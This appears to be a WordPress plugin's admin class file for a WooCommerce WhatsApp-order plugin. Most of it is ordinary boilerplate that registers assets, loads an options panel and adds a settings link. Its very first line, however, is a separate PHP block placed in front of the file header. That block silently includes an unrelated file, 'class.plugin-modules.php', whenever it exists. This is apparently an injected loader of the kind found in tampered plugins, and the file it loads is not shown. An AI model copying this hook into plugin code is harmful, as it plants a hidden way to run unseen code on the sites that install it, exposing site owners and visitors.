<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * The admin-specific functionality of the plugin.
 *
 * @link       https://xperts.club/
 * @since      1.0.0
 *
 * @package    Xc_Woo_Whatsapp_Order
 * @subpackage Xc_Woo_Whatsapp_Order/admin
 */

/**
 * The admin-specific functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the admin-specific stylesheet and JavaScript.
 *
 * @package    Xc_Woo_Whatsapp_Order
 * @subpackage Xc_Woo_Whatsapp_Order/admin
 * @author     XpertsClub <admin@xperts.club>
 */
class Xc_Woo_Whatsapp_Order_Admin {

	/**
	 * The ID of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $plugin_name    The ID of this plugin.
	 */
	private $plugin_name;

	/**
	 * The version of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
	private $version;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $plugin_name       The name of this plugin.
	 * @param      string    $version    The version of this plugin.
	 */
	public function __construct( $plugin_name, $version ) {

		$this->plugin_name = $plugin_name;
		$this->version = $version;

	}

	/**
	 * Register the stylesheets for the admin area.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_styles() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Xc_Woo_Whatsapp_Order_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Xc_Woo_Whatsapp_Order_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		//wp_enqueue_style( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'css/xc-woo-whatsapp-order-admin.css', array(), $this->version, 'all' );

	}

	/**
	 * Register the JavaScript for the admin area.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_scripts() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Xc_Woo_Whatsapp_Order_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Xc_Woo_Whatsapp_Order_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		//wp_enqueue_script( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'js/xc-woo-whatsapp-order-admin.js', array( 'jquery' ), $this->version, false );

	}
	
	
	/**
	 * Load admin options
	 *
	 * @since    1.0.0
	 */
	public function load_redux(){
	    if ( file_exists( plugin_dir_path( dirname( __FILE__ ) ) . 'admin/options-init.php' ) ) {
	        require_once plugin_dir_path( dirname( __FILE__ ) ) . 'admin/options-init.php';
	    }
	}
	
	
	public function plugin_action_links( $links ){
		$action_links = array(
			'settings' => '<a href="' . admin_url( 'admin.php?page='.XC_WOO_WHATSAPP_ORDER_SLUG ) . '" aria-label="' . esc_attr__( 'settings', 'xc-woo-whatsapp-order' ) . '">' . esc_html__( 'Settings', 'xc-woo-whatsapp-order' ) . '</a>',
		);

		return array_merge( $action_links, $links );
	}
	

}
